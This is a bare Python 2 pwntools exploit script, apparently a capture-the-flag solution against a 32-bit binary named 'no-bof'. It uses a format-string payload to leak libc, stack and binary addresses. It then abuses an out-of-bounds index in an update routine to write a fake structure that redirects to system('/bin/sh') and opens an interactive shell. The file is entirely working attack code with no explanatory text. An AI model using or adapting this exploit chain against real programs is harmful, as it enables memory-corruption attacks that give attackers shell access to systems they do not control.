from pwn import *

elf = ELF('no-bof')
#lib = ELF('x32_libc-2.19.so')
lib = ELF('/lib32/libc-2.19.so')
context.arch = 'i386'

def leakAll():
	r.sendlineafter('Your input: ','4 %5$p %26$p %21$p \x00/bin/sh;')
	r.recvuntil('Your choice is:4 ')

def Insert(title,price):
	r.sendlineafter('Your input: ','1')
	r.sendlineafter('title: ',title)
	r.sendlineafter('price: ',str(price))
def Update(index,title,price):
	r.sendlineafter('Your input: ','2')
	r.sendlineafter('update?\n',str(index))
	r.sendlineafter('title: ',title)
	r.sendlineafter('price: ',str(price))
def Delete(index):
	r.sendlineafter('Your input: ','3')
	r.sendlineafter('delete?\n',str(index))
def pwn():
	r = process('./no-bof')
	global r
	leakAll()
	leak0 = r.recvuntil(' ')
	libase = int(leak0.strip(),16) - 0x1a8000
	leak1 = r.recvuntil(' ')
	stack = int(leak1,16)
	leak2 = r.recvuntil(' ')
	wtbase = int(leak2.strip(),16)
	log.info('LIBC BASE -> '+str(hex(libase)))
	log.info('WRIT BASE -> '+str(hex(wtbase)))
	log.info('STACK ->'+str(hex(stack)))
	fuck_index = ((0 - elf.symbols['books'])-(0xffffffff - stack))/0x100
	log.info('FAKE INDEX = '+hex(fuck_index))
	fake_fill = ''
	x = (stack&0xf0)>>4
	if(x == 0x2):
		fake_fill+=p32(0x16)+p32(0x0)+p32(0x0)
		fake_fill+=p32(stack)
		fake_fill+=p32(libase+lib.symbols['system'])
		fake_fill+=p32(0xdeadbeef)
		fake_fill+=p32(wtbase+20)
		raw_input()
	else:
		print 'GG'
		r.close()
		pwn()
	Update(fuck_index,fake_fill,0xf8)
	r.interactive()

pwn()

